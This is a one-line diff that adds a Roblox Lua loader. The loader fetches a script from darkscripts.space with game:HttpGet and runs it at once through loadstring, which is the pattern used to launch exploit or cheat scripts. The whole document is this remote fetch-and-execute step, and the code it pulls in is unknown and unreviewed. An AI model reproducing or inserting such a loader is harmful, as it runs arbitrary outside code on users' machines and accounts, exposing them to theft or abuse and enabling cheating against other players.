@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://darkscripts.space/scripts/fd5aa0d444.lua', true))()
